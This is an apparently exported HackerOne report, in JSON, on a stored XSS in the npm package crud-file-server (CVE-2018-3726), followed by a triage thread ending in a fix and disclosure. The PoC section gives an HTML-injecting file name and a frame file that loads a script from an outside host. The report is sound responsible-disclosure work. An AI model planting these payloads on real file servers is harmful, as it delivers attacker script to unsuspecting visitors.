{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "jokebookservice1", 
        "eveeez", 
        "khaledibnalwalid", 
        "japz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 311101, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-02-17T17:51:41.894Z", 
    "vulnerability_information": "Hi Guys,\n\n**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\n\n## Module\n\n**crud-file-server**\n\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\n\nhttps://www.npmjs.com/package/crud-file-server\n\nversion: 0.7.0\n\nStats\n0 downloads in the last day\n26 downloads in the last week\n220 downloads in the last month\n\n~2500 estimated downloads per year\n\n\n## Description\n\nThis vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:\n\n```javascript\n// node_modules/crud-file-server/crud-file-server.js, line 137\n    res.setHeader('Content-Type', 'text/html');\t\t\t\t\t\t\t\t\t\t\t\n    res.write('<html><body>');\n    for(var f = 0; f < results.length; f++) {\n        var name = results[f].name;\n        var normalized = url + '/' + name;\n        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n        res.write('\\r\\n<p><a href=\"/' + normalized + '\">' + name + '</a></p>');\n    }\n    res.end('\\r\\n</body></html>');\n```\n## PoC - Steps To Reproduce:\n\n- install ```crud-file-server```\n\n```\n$ npm install crud-file-server\n```\n\n\n- in the directory which will be served via ```crud-file-server```, create file with following name:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\n- create second file with name ```malware_frame.html``` with following content and save it in the same directory:\n\n\n```\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"http://bl4de.tech/poc.js\"></script>\n</body>\n\n</html>\n```\n\nRun ```crud-file-server``` in directory with file with changed filename:\n\n```\n$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n\nusage:\n  crud-file-server [options]\n\nthis starts a file server using the specified command-line options\n\noptions:\n\n  -f file system path to expose over http\n  -h log head requests\n  -p port to listen on (example, 80)\n  -q suppress this message\n  -r read only\n  -v virtual path to host the file server on\n\nexample:\n\n  crud-file-server -f c:/ -p 8080 -q -v filez\n\nlistening on :8080/, serving ./\n```\n\nand open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:\n\n{F259251}\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability can be used to eg. download malware via \"drive-by-download\" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "low", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "changed", 
            "integrity": "high", 
            "availability": "none"
        }, 
        "rating": "critical", 
        "score": 9.6, 
        "author_type": "Team"
    }, 
    "title": "[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "crud-file-server", 
        "max_severity": "critical", 
        "databaseId": 5800, 
        "asset_type": "SOURCE_CODE"
    }, 
    "allow_singular_disclosure_at": "2018-03-19T17:51:41.992Z", 
    "state": "Closed", 
    "cve_ids": [
        "CVE-2018-3726"
    ], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "1.png", 
            "type": "image/png", 
            "id": 259251, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222657Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4e628db5cf4055dd7ffdb58355df71ac8d8ea231fba1c7e07fafff52e9d0eaec"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-01-31T22:03:26.653Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-31T22:03:26.653Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi @bl4de \n\nThanks a lot for reporting this to us.\nA member of the team will look at your report and triage it shortly!\n", 
            "markdown_message": "<p>Hi <a href=\"/bl4de\">@bl4de</a> </p>\n\n<p>Thanks a lot for reporting this to us.<br>\nA member of the team will look at your report and triage it shortly!</p>\n", 
            "type": "Activities::Comment", 
            "id": 2340387, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-02T12:07:13.410Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-02T12:07:13.410Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Hi\u00a0@bl4de,\n\nThanks for reporting this issue to us.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue. \n", 
            "markdown_message": "<p>Hi\u00a0@bl4de,</p>\n\n<p>Thanks for reporting this issue to us.</p>\n\n<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue. </p>\n", 
            "type": "Activities::Comment", 
            "id": 2344938, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-02T12:07:30.224Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-02T12:07:30.224Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 2344940, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-02T12:13:33.115Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-02T12:13:33.115Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Critical (9.6)", 
                "old_severity": "Medium"
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2344961, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "old_scope": "Other module", 
            "created_at": "2018-02-08T03:37:55.128Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-08T03:37:55.128Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "new_scope": "crud-file-server", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ChangedScope", 
            "id": 2361061, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-08T03:38:27.420Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-08T03:38:27.420Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "cve_ids": [
                "CVE-2018-3726"
            ], 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::CveIdAdded", 
            "id": 2361063, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-14T20:56:39.928Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-14T20:56:39.928Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Since the author didn't join the report I opened a security issue in the repo.", 
            "markdown_message": "<p>Since the author didn&#39;t join the report I opened a security issue in the repo.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2384090, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-15T13:40:42.198Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-15T13:40:42.198Z", 
            "actor": {
                "username": "omphalos", 
                "url": "/omphalos", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ExternalUserJoined", 
            "id": 2386557, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-15T13:44:10.097Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-15T13:44:10.097Z", 
            "actor": {
                "username": "omphalos", 
                "url": "/omphalos", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@bl4de you mentioned there is another issue related to crud-file-server - I'm not sure how to find it on this site.  Can you point me to it please?", 
            "markdown_message": "<p><a href=\"/bl4de\">@bl4de</a> you mentioned there is another issue related to crud-file-server - I&#39;m not sure how to find it on this site.  Can you point me to it please?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2386567, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-15T13:54:57.909Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-15T13:54:57.909Z", 
            "actor": {
                "username": "bl4de", 
                "url": "/bl4de", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@omphalos \n\nSure, that's this report:\n\nhttps://hackerone.com/reports/310690\n\nBut I believe to be able to see one, some of triage team has to invite you to join it (I can't do this as reporter).", 
            "markdown_message": "<p><a href=\"/omphalos\">@omphalos</a> </p>\n\n<p>Sure, that&#39;s this report:</p>\n\n<p><a title=\"https://hackerone.com/reports/310690\" href=\"https://hackerone.com/reports/310690\">https://hackerone.com/reports/310690</a></p>\n\n<p>But I believe to be able to see one, some of triage team has to invite you to join it (I can&#39;t do this as reporter).</p>\n", 
            "type": "Activities::Comment", 
            "id": 2386590, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-15T14:07:56.783Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-15T14:07:56.783Z", 
            "actor": {
                "username": "omphalos", 
                "url": "/omphalos", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Thanks @bl4de!\n\n@lirantal if there is a remaining issue with crud-file-server I will be happy to help with it.\n", 
            "markdown_message": "<p>Thanks <a href=\"/bl4de\">@bl4de</a>!</p>\n\n<p><a href=\"/lirantal\">@lirantal</a> if there is a remaining issue with crud-file-server I will be happy to help with it.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2386617, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-15T18:57:26.462Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-15T18:57:26.462Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@omphalos thanks for jumping in!\nI invited you to the other issue as well where you will collaborate on it with my colleague @vdeturckheim.\nGoodluck and thank you for your pro-active attitude!\n\nWith regards to this issue, is there a fix added already that @bl4de can verify?", 
            "markdown_message": "<p><a href=\"/omphalos\">@omphalos</a> thanks for jumping in!<br>\nI invited you to the other issue as well where you will collaborate on it with my colleague <a href=\"/vdeturckheim\">@vdeturckheim</a>.<br>\nGoodluck and thank you for your pro-active attitude!</p>\n\n<p>With regards to this issue, is there a fix added already that <a href=\"/bl4de\">@bl4de</a> can verify?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2387519, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T00:25:20.345Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T00:33:09.126Z", 
            "actor": {
                "username": "omphalos", 
                "url": "/omphalos", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@lirantal, @bl4de stated he verified the fix for this issue in the github thread.", 
            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a>, <a href=\"/bl4de\">@bl4de</a> stated he verified the fix for this issue in the github thread.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2388406, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T00:43:45.587Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T00:43:45.587Z", 
            "actor": {
                "username": "bl4de", 
                "url": "/bl4de", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@lirantal - I can confirm issue is fixed and not reproducible anymore.\n\n@omphalos - thanks for quick fixes, I am happy I was able to help :)", 
            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> - I can confirm issue is fixed and not reproducible anymore.</p>\n\n<p><a href=\"/omphalos\">@omphalos</a> - thanks for quick fixes, I am happy I was able to help :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 2388425, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T09:47:15.905Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T09:47:15.905Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "Oh great, awesome work!\n\nAre you guys ok if I go ahead and fully public disclose the report now?", 
            "markdown_message": "<p>Oh great, awesome work!</p>\n\n<p>Are you guys ok if I go ahead and fully public disclose the report now?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2390172, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T10:28:53.274Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T10:28:53.274Z", 
            "actor": {
                "username": "bl4de", 
                "url": "/bl4de", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@lirantal Yep, I'm fine, as always :)", 
            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> Yep, I&#39;m fine, as always :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 2390238, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T14:21:31.010Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T14:21:31.010Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@omphalos ?", 
            "markdown_message": "<p><a href=\"/omphalos\">@omphalos</a> ?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2390716, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-16T23:50:30.580Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-16T23:50:30.580Z", 
            "actor": {
                "username": "omphalos", 
                "url": "/omphalos", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "@lirantal yes that would be great, thank you.", 
            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> yes that would be great, thank you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2392251, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bl4de", 
                "url": "/bl4de"
            }, 
            "created_at": "2018-02-17T17:51:31.528Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T17:51:31.528Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2395025, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-17T17:51:41.948Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T17:51:41.948Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2395026, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-17T17:51:51.519Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T17:51:51.519Z", 
            "actor": {
                "username": "lirantal", 
                "url": "/lirantal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "nodejs-ecosystem", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 2395027, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bl4de", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bl4de", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -22653315.522817574, 
    "disclosed_at": "2018-02-17T17:51:51.597Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/311101", 
    "created_at": "2018-01-31T20:38:25.774Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p><strong>crud-file-server</strong> allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>crud-file-server</strong></p>\n\n<p>This package exposes a directory and its children to create, read, update, and delete operations over http.</p>\n\n<p><a title=\"https://www.npmjs.com/package/crud-file-server\" href=\"/redirect?signature=26cd6fdb65243d8c5176af8b61ba979874a2f80e&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fcrud-file-server\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/crud-file-server</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>version: 0.7.0</p>\n\n<p>Stats<br>\n0 downloads in the last day<br>\n26 downloads in the last week<br>\n220 downloads in the last month</p>\n\n<p>~2500 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p>This vulnerability exists, because <code>name</code> which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// node_modules/crud-file-server/crud-file-server.js, line 137</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">setHeader</span><span class=\"p\">(</span><span class=\"s1\">&#39;Content-Type&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;text/html&#39;</span><span class=\"p\">);</span>                                         \n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"s1\">&#39;&lt;html&gt;&lt;body&gt;&#39;</span><span class=\"p\">);</span>\n    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">f</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">f</span> <span class=\"o\">&lt;</span> <span class=\"nx\">results</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">f</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">results</span><span class=\"p\">[</span><span class=\"nx\">f</span><span class=\"p\">].</span><span class=\"nx\">name</span><span class=\"p\">;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">normalized</span> <span class=\"o\">=</span> <span class=\"nx\">url</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;/&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">name</span><span class=\"p\">;</span>\n        <span class=\"k\">while</span><span class=\"p\">(</span><span class=\"nx\">normalized</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"s1\">&#39;/&#39;</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"nx\">normalized</span> <span class=\"o\">=</span> <span class=\"nx\">normalized</span><span class=\"p\">.</span><span class=\"nx\">slice</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"nx\">normalized</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">);</span> <span class=\"p\">}</span>\n        <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">write</span><span class=\"p\">(</span><span class=\"s1\">&#39;\\r\\n&lt;p&gt;&lt;a href=&quot;/&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">normalized</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&quot;&gt;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&lt;/a&gt;&lt;/p&gt;&#39;</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nx\">end</span><span class=\"p\">(</span><span class=\"s1\">&#39;\\r\\n&lt;/body&gt;&lt;/html&gt;&#39;</span><span class=\"p\">);</span>\n</code></pre>\n<h2 id=\"poc-steps-to-reproduce\">PoC - Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>crud-file-server</code>\n</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install crud-file-server\n</code></pre>\n<ul>\n<li>in the directory which will be served via <code>crud-file-server</code>, create file with following name:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>&quot;&gt;&lt;iframe src=&quot;malware_frame.html&quot;&gt;\n</code></pre>\n<ul>\n<li>create second file with name <code>malware_frame.html</code> with following content and save it in the same directory:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n\n<span class=\"nt\">&lt;head&gt;</span>\n    <span class=\"nt\">&lt;meta</span> <span class=\"na\">charset=</span><span class=\"s\">&quot;utf8&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;title&gt;</span>Frame embeded with malware :P<span class=\"nt\">&lt;/title&gt;</span>\n<span class=\"nt\">&lt;/head&gt;</span>\n\n<span 